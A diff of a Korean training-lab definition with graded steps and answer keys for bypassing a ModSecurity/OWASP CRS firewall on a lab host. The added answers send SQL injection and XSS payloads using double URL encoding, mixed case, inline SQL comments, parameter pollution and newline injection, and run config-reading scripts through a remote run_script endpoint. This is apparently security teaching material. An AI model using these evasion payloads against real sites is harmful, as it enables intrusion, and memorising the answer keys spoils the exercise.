@@ -1,179 +1,102 @@
 lab_id: "web-vuln-nonai-week14"
-title: "WAF 우회 실습"
+title: "WAF 우회 기법 실습"
 version: "non-ai"
 course: "web-vuln-nonai"
 week: 14
-description: "웹 애플리케이션 방화벽의 탐지 규칙을 분석하고 우회 기법을 실습합니다."
+description: "modsecurity WAF의 탐지 룰을 분석하고, 다양한 인코딩/난독화 기법으로 우회를 시도합니다."
 difficulty: "hard"
 duration_minutes: 120
 objectives:
-  - "WAF 동작 원리를 이해한다"
-  - "다양한 우회 기법을 실습한다"
-  - "WAF 규칙 강화를 학습한다"
+  - "WAF의 탐지 원리를 이해한다"
+  - "인코딩, 대소문자 변환, 주석 삽입 등 우회 기법을 실습한다"
+  - "WAF 룰 튜닝의 필요성을 학습한다"
 pass_threshold: 0.6
 steps:
   - order: 1
-    instruction: "10.20.30.80 대상으로 WAF 존재 여부 탐지을(를) 수행하시오."
-    hint: "WAF 존재 여부 탐지 관련 도구와 기법을 활용하세요."
-    category: "waf"
+    instruction: "웹서버(10.20.30.80)의 modsecurity CRS 룰 목록을 확인하라. SubAgent를 통해 활성화된 룰 파일을 나열하라."
+    hint: "SubAgent로 /usr/share/modsecurity-crs/rules/ 디렉토리를 조회하세요."
+    category: "recon"
     points: 8
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'WAF 존재 여부 탐지 완료'"
-    answer_detail: "WAF 존재 여부 탐지은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    answer: "curl -s -X POST http://10.20.30.80:8002/a2a/run_script -H 'Content-Type: application/json' -d '{\"script\":\"ls /usr/share/modsecurity-crs/rules/*.conf | wc -l && ls /usr/share/modsecurity-crs/rules/*.conf | head -10\"}' | python3 -c \"import sys,json; print(json.load(sys.stdin).get('stdout',''))\""
+    answer_detail: "OWASP CRS에는 REQUEST-9xx(요청 검사)와 RESPONSE-9xx(응답 검사) 룰이 있습니다. 930(LFI), 931(RFI), 932(RCE), 933(PHP), 941(XSS), 942(SQLi) 등 공격 유형별로 분류됩니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: ".conf"
       field: "stdout"
   - order: 2
-    instruction: "10.20.30.80 대상으로 WAF 종류 및 버전 식별을(를) 수행하시오."
-    hint: "WAF 종류 및 버전 식별 관련 도구와 기법을 활용하세요."
-    category: "waf"
-    points: 10
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'WAF 종류 및 버전 식별 완료'"
-    answer_detail: "WAF 종류 및 버전 식별은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "기본 SQLi 페이로드로 WAF 차단을 확인하라. ' OR 1=1-- 를 쿼리 파라미터로 보내라."
+    hint: "curl 'http://10.20.30.80/?id=1+OR+1=1--' 형태로 보내세요."
+    category: "exploit"
+    points: 8
+    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1%27%20OR%201=1--' && echo ' (SQLi basic)'"
+    answer_detail: "modsecurity CRS 942xxx 룰이 SQLi 패턴(OR, UNION, SELECT, --)을 탐지합니다. 403이면 WAF가 정상 작동하는 것입니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "403"
       field: "stdout"
   - order: 3
-    instruction: "10.20.30.80 대상으로 URL/Double 인코딩 우회 기법을(를) 수행하시오."
-    hint: "URL/Double 인코딩 우회 기법 관련 도구와 기법을 활용하세요."
-    category: "bypass"
-    points: 10
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'URL/Double 인코딩 우회 기법 완료'"
-    answer_detail: "URL/Double 인코딩 우회 기법은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "URL 이중 인코딩으로 SQLi WAF 우회를 시도하라. OR을 %254F%2552로 이중 인코딩하라."
+    hint: "%25 = %, 4F = O, 52 = R. 이중 인코딩하면 서버가 두 번 디코딩할 때 원래 문자가 됩니다."
+    category: "exploit"
+    points: 12
+    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1%2527%2520%254F%2552%25201%253D1' && echo ' (double encoded SQLi)' && curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1%27+%4F%52+1%3D1' && echo ' (single encoded)'"
+    answer_detail: "이중 인코딩은 WAF가 한 번만 디코딩하고 서버가 다시 디코딩할 때 공격 페이로드가 복원되는 기법입니다. 현대 WAF는 재귀적 디코딩으로 이를 방어합니다."
     verify:
-      type: "output_contains"
-      expect: "완료"
+      type: "output_regex"
+      expect: "403|200"
       field: "stdout"
   - order: 4
-    instruction: "10.20.30.80 대상으로 대소문자 혼합 우회 기법을(를) 수행하시오."
-    hint: "대소문자 혼합 우회 기법 관련 도구와 기법을 활용하세요."
-    category: "bypass"
+    instruction: "대소문자 변환으로 XSS WAF 우회를 시도하라. <ScRiPt>alert(1)</ScRiPt>를 보내라."
+    hint: "HTML 태그는 대소문자를 구분하지 않지만 WAF 룰은 구분할 수 있습니다."
+    category: "exploit"
     points: 10
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '대소문자 혼합 우회 기법 완료'"
-    answer_detail: "대소문자 혼합 우회 기법은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?q=%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E' && echo ' (mixed case XSS)' && curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?q=%3Cscript%3Ealert(1)%3C/script%3E' && echo ' (normal case XSS)'"
+    answer_detail: "HTML은 대소문자를 구분하지 않으므로 <ScRiPt>도 <script>와 동일하게 실행됩니다. 정규식 기반 WAF가 소문자만 매칭하면 우회됩니다. CRS는 (?i) 플래그로 대소문자 무시 매칭합니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "403"
       field: "stdout"
   - order: 5
-    instruction: "10.20.30.80 대상으로 SQL 주석 삽입 우회 기법을(를) 수행하시오."
-    hint: "SQL 주석 삽입 우회 기법 관련 도구와 기법을 활용하세요."
-    category: "bypass"
-    points: 10
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'SQL 주석 삽입 우회 기법 완료'"
-    answer_detail: "SQL 주석 삽입 우회 기법은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "SQL 주석을 이용한 WAF 우회를 시도하라. UNION/**/SELECT 형태로 공백 대신 주석을 삽입하라."
+    hint: "SQL에서 /* */는 주석이고 파서가 무시하지만, WAF는 이를 제대로 처리하지 못할 수 있습니다."
+    category: "exploit"
+    points: 12
+    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1+UNION/**/SELECT/**/1,2,3' && echo ' (comment bypass)' && curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1+UN%49ON+SEL%45CT+1' && echo ' (partial encode)'"
+    answer_detail: "SQL 인라인 주석(/**/)을 공백 대신 사용하면 일부 WAF를 우회할 수 있습니다. CRS는 이 패턴도 탐지하지만, 중첩 주석(/!*...*/), HEX 인코딩 등은 더 복잡합니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "403"
       field: "stdout"
   - order: 6
-    instruction: "10.20.30.80 대상으로 HTTP 파라미터 오염(HPP) 기법을(를) 수행하시오."
-    hint: "HTTP 파라미터 오염(HPP) 기법 관련 도구와 기법을 활용하세요."
-    category: "bypass"
-    points: 12
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'HTTP 파라미터 오염(HPP) 기법 완료'"
-    answer_detail: "HTTP 파라미터 오염(HPP) 기법은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "HTTP Parameter Pollution(HPP)으로 WAF 우회를 시도하라. 같은 파라미터를 여러 번 전달하라."
+    hint: "?id=1&id=OR+1=1 형태로 파라미터를 중복하세요."
+    category: "exploit"
+    points: 10
+    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1&id=OR+1%3D1--' && echo ' (HPP)' && curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1%0aOR%0a1=1' && echo ' (newline injection)'"
+    answer_detail: "HPP는 같은 파라미터를 여러 번 보내어 WAF와 백엔드가 다른 값을 사용하게 만드는 기법입니다. ASP.NET은 쉼표로 결합하고 PHP는 마지막 값을 사용하여 불일치가 발생할 수 있습니다."
     verify:
-      type: "output_contains"
-      expect: "완료"
+      type: "output_regex"
+      expect: "403|200"
       field: "stdout"
   - order: 7
-    instruction: "10.20.30.80 대상으로 청크 전송 인코딩 우회을(를) 수행하시오."
-    hint: "청크 전송 인코딩 우회 관련 도구와 기법을 활용하세요."
-    category: "bypass"
+    instruction: "WAF의 anomaly scoring 설정을 확인하라. SubAgent로 modsecurity.conf의 SecRuleEngine 설정과 anomaly threshold를 확인하라."
+    hint: "SubAgent로 /etc/modsecurity/modsecurity.conf와 crs-setup.conf를 확인하세요."
+    category: "defense"
     points: 10
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '청크 전송 인코딩 우회 완료'"
-    answer_detail: "청크 전송 인코딩 우회은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    answer: "curl -s -X POST http://10.20.30.80:8002/a2a/run_script -H 'Content-Type: application/json' -d '{\"script\":\"grep -E \\\"SecRuleEngine|anomaly_score_threshold\\\" /etc/modsecurity/modsecurity.conf /etc/modsecurity/crs/crs-setup.conf 2>/dev/null\"}' | python3 -c \"import sys,json; print(json.load(sys.stdin).get('stdout',''))\""
+    answer_detail: "SecRuleEngine On은 차단 모드, DetectionOnly는 탐지만 합니다. anomaly_score_threshold는 누적 점수 기준으로, 여러 약한 시그널이 합산되어 차단됩니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "SecRuleEngine"
       field: "stdout"
   - order: 8
-    instruction: "10.20.30.80 대상으로 유니코드 정규화 우회 기법을(를) 수행하시오."
-    hint: "유니코드 정규화 우회 기법 관련 도구와 기법을 활용하세요."
-    category: "bypass"
-    points: 10
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '유니코드 정규화 우회 기법 완료'"
-    answer_detail: "유니코드 정규화 우회 기법은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 9
-    instruction: "10.20.30.80 대상으로 Content-Type 변조 우회을(를) 수행하시오."
-    hint: "Content-Type 변조 우회 관련 도구와 기법을 활용하세요."
-    category: "bypass"
-    points: 10
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'Content-Type 변조 우회 완료'"
-    answer_detail: "Content-Type 변조 우회은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 10
-    instruction: "10.20.30.80 대상으로 HTTP 메서드 변조 우회을(를) 수행하시오."
-    hint: "HTTP 메서드 변조 우회 관련 도구와 기법을 활용하세요."
-    category: "bypass"
-    points: 10
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'HTTP 메서드 변조 우회 완료'"
-    answer_detail: "HTTP 메서드 변조 우회은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 11
-    instruction: "10.20.30.80 대상으로 IP 기반 차단 우회 기법을(를) 수행하시오."
-    hint: "IP 기반 차단 우회 기법 관련 도구와 기법을 활용하세요."
-    category: "bypass"
-    points: 10
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'IP 기반 차단 우회 기법 완료'"
-    answer_detail: "IP 기반 차단 우회 기법은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 12
-    instruction: "10.20.30.80 대상으로 페이로드 분할 우회 기법을(를) 수행하시오."
-    hint: "페이로드 분할 우회 기법 관련 도구와 기법을 활용하세요."
-    category: "bypass"
-    points: 10
-    answer: "curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '페이로드 분할 우회 기법 완료'"
-    answer_detail: "페이로드 분할 우회 기법은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 13
-    instruction: "10.20.30.80 대상으로 WAF 규칙 튜닝 및 강화을(를) 수행하시오."
-    hint: "WAF 규칙 튜닝 및 강화 관련 도구와 기법을 활용하세요."
-    category: "defense"
-    points: 10
-    answer: "echo '=== WAF 규칙 튜닝 및 강화 ===' && echo '조치 방안 정리 완료'"
-    answer_detail: "WAF 규칙 튜닝 및 강화은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 14
-    instruction: "10.20.30.80 대상으로 다층 방어 전략 수립을(를) 수행하시오."
-    hint: "다층 방어 전략 수립 관련 도구와 기법을 활용하세요."
-    category: "defense"
-    points: 12
-    answer: "echo '=== 다층 방어 전략 수립 ===' && echo '조치 방안 정리 완료'"
-    answer_detail: "다층 방어 전략 수립은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 15
-    instruction: "WAF 우회 실습 종합 보고서를 작성하시오."
-    hint: "발견 취약점, 영향, 조치를 포함하세요."
-    category: "verification"
+    instruction: "WAF 우회 실습 결과를 /tmp/waf_bypass_report.txt에 정리하라."
+    hint: "시도한 우회 기법과 성공/실패 여부를 포함하세요."
+    category: "reporting"
     points: 8
-    answer: "echo '=== WAF 우회 실습 보고서 ===' && echo '대상: http://10.20.30.80' && echo '=== 보고서 완료 ==='"
-    answer_detail: "취약점 진단 보고서는 발견사항, 위험도, 재현 방법, 조치 권고를 포함합니다."
+    answer: "cat > /tmp/waf_bypass_report.txt << 'EOF'\n=== WAF 우회 실습 보고서 ===\n대상: modsecurity + OWASP CRS (10.20.30.80)\n\n우회 기법 테스트:\n1. 이중 인코딩: CRS에서 차단됨\n2. 대소문자 변환: CRS (?i) 플래그로 차단됨\n3. SQL 주석 삽입: CRS에서 차단됨\n4. HPP: 부분적 우회 가능성\n5. 줄바꿈 삽입: CRS에서 차단됨\n\n결론: OWASP CRS 3.x는 일반적 우회 기법에 강건함.\n고급 우회에는 WAF 룰 커스터마이징 + 정기적 테스트 필요.\nEOF\ncat /tmp/waf_bypass_report.txt"
+    answer_detail: "WAF는 만능이 아닙니다. 새로운 우회 기법이 지속 발견되므로, WAF만 의존하지 말고 서버 측 입력 검증을 병행해야 합니다. 정기적 WAF 테스트와 룰 업데이트가 필수입니다."
     verify:
       type: "output_contains"
-      expect: "보고서 완료"
+      expect: "WAF 우회 실습 보고서"
       field: "stdout"
